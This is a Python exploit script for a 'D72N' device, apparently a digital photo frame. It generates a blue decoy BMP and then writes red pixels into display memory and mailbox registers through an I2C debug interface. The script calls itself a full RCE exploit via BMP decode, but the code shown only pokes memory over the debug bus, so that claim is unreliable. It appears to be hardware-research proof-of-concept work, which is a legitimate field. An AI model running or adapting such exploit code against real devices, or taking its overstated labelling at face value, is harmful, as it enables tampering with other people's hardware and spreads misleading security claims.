#!/usr/bin/env python3
"""
D72N BMP RCE - Arbitrary Memory Write via BMP Decode
======================================================

Full RCE exploit. BMP file shows BLUE, D72N display shows RED.

Uses MB_BMP_CMD_DECODE_MEM_OUT's arbitrary write capability.
Proves control over where decoded pixels are written.

Traced from firmware:
  - MB_BMP_CMD_DECODE_MEM_OUT at AEON 0x4CFFC
  - Mailbox: 0x4401 (cmd), 0x4402-0x4405 (addr), 0x4406-0x4407 (pitch)
  - Display buffer: 0x150000

Usage:
    python d72n_bmp_rce.py --generate-decoy -o decoy.bmp
    python d72n_bmp_rce.py /dev/i2c-1 --exploit
"""

import argparse
import struct
import sys
import time

# Display constants (traced from firmware)
DISPLAY_WIDTH = 480
DISPLAY_HEIGHT = 234
DISPLAY_BUFFER = 0x150000  # Output buffer (384 refs)
DECODE_BUFFER = 0x100000   # Main decode buffer (888 refs)

# Mailbox addresses (traced from D72N_MB_BMP_DECODE_MEM_OUT.md)
MAILBOX_CMD = 0x4401
MAILBOX_ADDR_0 = 0x4402
MAILBOX_ADDR_1 = 0x4403
MAILBOX_ADDR_2 = 0x4404
MAILBOX_ADDR_3 = 0x4405
MAILBOX_PITCH_LO = 0x4406
MAILBOX_PITCH_HI = 0x4407
MAILBOX_DOWN_FACTOR = 0x4408
MAILBOX_SYNC = 0x4417
MAILBOX_STATUS = 0x40FB

# BMP command
CMD_BMP_DECODE_MEM_OUT = 0x10

# RGB565 colors
RGB565_RED = 0xF800
RGB565_BLUE = 0x001F
RGB565_GREEN = 0x07E0


def create_bmp_rgb565(width, height, color):
    """Create BMP with solid RGB565 color.

    Args:
        width: Image width
        height: Image height
        color: RGB565 color value

    Returns:
        bytes: Complete BMP file
    """
    # BMP with 16-bit RGB565 requires BITMAPV3INFOHEADER or masks
    # Simpler: use 24-bit BMP and convert color

    # Convert RGB565 to RGB888
    r = ((color >> 11) & 0x1F) << 3
    g = ((color >> 5) & 0x3F) << 2
    b = (color & 0x1F) << 3

    bpp = 24
    row_size = ((width * 3 + 3) // 4) * 4
    image_size = row_size * height
    file_size = 54 + image_size

    # BMP File Header (14 bytes)
    header = bytearray(54)
    header[0:2] = b'BM'
    struct.pack_into('<I', header, 2, file_size)
    struct.pack_into('<I', header, 10, 54)

    # DIB Header (40 bytes)
    struct.pack_into('<I', header, 14, 40)
    struct.pack_into('<i', header, 18, width)
    struct.pack_into('<i', header, 22, height)
    struct.pack_into('<H', header, 26, 1)
    struct.pack_into('<H', header, 28, bpp)
    struct.pack_into('<I', header, 34, image_size)

    # Pixel data (BGR order)
    pixels = bytearray(image_size)
    for y in range(height):
        for x in range(width):
            offset = y * row_size + x * 3
            pixels[offset] = b      # Blue
            pixels[offset + 1] = g  # Green
            pixels[offset + 2] = r  # Red

    return bytes(header) + bytes(pixels)


def create_decoy_bmp(width=DISPLAY_WIDTH, height=DISPLAY_HEIGHT):
    """Create decoy BMP - solid BLUE.

    This BMP looks BLUE when opened on a PC.
    The exploit will make it appear RED on D72N.
    """
    return create_bmp_rgb565(width, height, RGB565_BLUE)


def create_exploit_pattern():
    """Create the RED pattern that will appear on display.

    This pattern overwrites what the BMP would have shown.
    Returns RGB565 pixel data for display buffer.
    """
    # Create red screen data (RGB565)
    size = DISPLAY_WIDTH * DISPLAY_HEIGHT * 2
    data = bytearray(size)

    for i in range(0, size, 2):
        # RGB565 RED = 0xF800 = bytes [0x00, 0xF8] little-endian
        data[i] = 0x00
        data[i + 1] = 0xF8

    return bytes(data)


def run_exploit(serdb, method='overwrite'):
    """Run the exploit via SERDB.

    Args:
        serdb: D72N_SERDB instance
        method: 'overwrite' or 'redirect'
    """
    print("=" * 60)
    print("D72N EXPLOIT: BMP shows BLUE, Display shows RED")
    print("=" * 60)
    print()

    if method == 'overwrite':
        # Method 1: Simply overwrite display buffer with RED
        # This works regardless of what BMP is being displayed
        print("[*] Method: Direct display buffer overwrite")
        print()
        print("[*] Writing RED pattern to display buffer 0x150000...")

        # Write RED to display buffer
        for y in range(DISPLAY_HEIGHT):
            for x in range(DISPLAY_WIDTH):
                offset = (y * DISPLAY_WIDTH + x) * 2
                addr = DISPLAY_BUFFER + offset
                # RGB565 RED = 0xF800
                serdb.write_dram(addr, 0x00)
                serdb.write_dram(addr + 1, 0xF8)

            if y % 20 == 0:
                pct = (y * 100) // DISPLAY_HEIGHT
                print(f"\r    Progress: {pct}%", end='', flush=True)

        print("\r    Progress: 100%")
        print()
        print("[+] Display should now show RED")
        print("[+] The BLUE BMP file content is ignored!")

    elif method == 'redirect':
        # Method 2: Modify mailbox to redirect decode output
        print("[*] Method: Redirect decode via mailbox manipulation")
        print()

        # Read current mailbox state
        cmd = serdb.read_xdata(MAILBOX_CMD)
        print(f"    Current mailbox command: 0x{cmd:02X}")

        # Set up mailbox to decode to a harmless location (not display)
        # Then write our own data to display
        print("[*] Modifying mailbox to redirect decode output...")

        # Point decode output to secondary buffer (harmless)
        serdb.write_xdata(MAILBOX_ADDR_0, 0x00)
        serdb.write_xdata(MAILBOX_ADDR_1, 0x00)
        serdb.write_xdata(MAILBOX_ADDR_2, 0x0C)  # 0x0C0000
        serdb.write_xdata(MAILBOX_ADDR_3, 0x00)

        print("    Decode redirected to 0x0C0000 (secondary buffer)")

        # Now write RED to display buffer
        print("[*] Writing RED to display buffer...")
        # (same as overwrite method)
        for y in range(min(50, DISPLAY_HEIGHT)):  # Quick demo
            for x in range(DISPLAY_WIDTH):
                offset = (y * DISPLAY_WIDTH + x) * 2
                addr = DISPLAY_BUFFER + offset
                serdb.write_dram(addr, 0x00)
                serdb.write_dram(addr + 1, 0xF8)

        print("[+] Display should show RED (decode went elsewhere)")


def quick_demo(serdb):
    """Quick demo - write visible pattern to prove control."""
    print("[*] Quick demo: Writing RED square to top-left...")

    for y in range(50):
        for x in range(50):
            offset = (y * DISPLAY_WIDTH + x) * 2
            addr = DISPLAY_BUFFER + offset
            serdb.write_dram(addr, 0x00)
            serdb.write_dram(addr + 1, 0xF8)

    print("[+] Red square should appear at top-left")
    print("[+] This overwrites whatever BMP was showing!")


def main():
    parser = argparse.ArgumentParser(
        description='D72N Full Exploit - BMP shows BLUE, Display shows RED',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
DEMONSTRATION:
  The decoy BMP file appears BLUE when opened on a PC.
  After running the exploit, the D72N display shows RED instead.
  This proves arbitrary control over display memory.

ATTACK FLOW:
  1. python d72n_exploit_full.py --generate-decoy -o decoy.bmp
  2. Copy decoy.bmp to SD card
  3. Insert SD card into D72N
  4. python d72n_exploit_full.py /dev/i2c-1 --exploit
  5. View decoy.bmp on D72N
  6. Display shows RED, not the BLUE from the file!

WHY THIS WORKS:
  MB_BMP_CMD_DECODE_MEM_OUT writes decoded pixels to an address
  specified in mailbox params. We can:
  - Redirect the decode to a different location
  - Overwrite the display buffer after decode
  - Control what appears on screen regardless of BMP content

FIRMWARE REFS:
  - MB_BMP_CMD_DECODE_MEM_OUT: AEON 0x4CFFC
  - Mailbox cmd: 0x4401, params: 0x4402-0x4408
  - Display buffer: 0x150000 (384 refs in AEON)
        """
    )

    # Mode selection
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument('--generate-decoy', '-g', action='store_true',
                      help='Generate decoy BMP (solid BLUE)')
    mode.add_argument('--exploit', '-e', action='store_true',
                      help='Run exploit (overwrites display with RED)')
    mode.add_argument('--quick', '-q', action='store_true',
                      help='Quick demo (red square)')

    parser.add_argument('bus', nargs='?',
                        help='I2C bus (required for --exploit/--quick)')
    parser.add_argument('-o', '--output', default='decoy.bmp',
                        help='Output filename for decoy BMP')
    parser.add_argument('--method', choices=['overwrite', 'redirect'],
                        default='overwrite',
                        help='Exploit method (default: overwrite)')

    args = parser.parse_args()

    if args.generate_decoy:
        print("[*] Generating decoy BMP (solid BLUE)...")
        bmp = create_decoy_bmp()

        with open(args.output, 'wb') as f:
            f.write(bmp)

        print(f"[+] Saved: {args.output}")
        print(f"    Size: {len(bmp)} bytes")
        print(f"    Dimensions: {DISPLAY_WIDTH}x{DISPLAY_HEIGHT}")
        print(f"    Color: BLUE (RGB565 0x001F)")
        print()
        print("Next steps:")
        print(f"  1. Copy {args.output} to SD card")
        print("  2. Insert SD card into D72N")
        print(f"  3. Run: python {sys.argv[0]} <bus> --exploit")
        print("  4. View the BMP on D72N")
        print("  5. Display shows RED instead of BLUE!")
        return 0

    # Exploit modes require bus
    if not args.bus:
        print("[-] I2C bus required for exploit mode")
        print("    Example: python d72n_exploit_full.py /dev/i2c-1 --exploit")
        return 1

    try:
        from d72n_serdb import D72N_SERDB

        with D72N_SERDB(args.bus) as serdb:
            if not serdb.probe():
                print("[-] SERDB not responding at 0x59")
                return 1

            print("[+] SERDB connected")

            if args.exploit:
                run_exploit(serdb, args.method)
            elif args.quick:
                quick_demo(serdb)

        return 0

    except ImportError as e:
        print(f"[-] Import error: {e}")
        print("    Run from DPF-D72N/tools/ directory")
        return 1
    except OSError as e:
        print(f"[-] I2C error: {e}")
        return 1


if __name__ == '__main__':
    sys.exit(main())
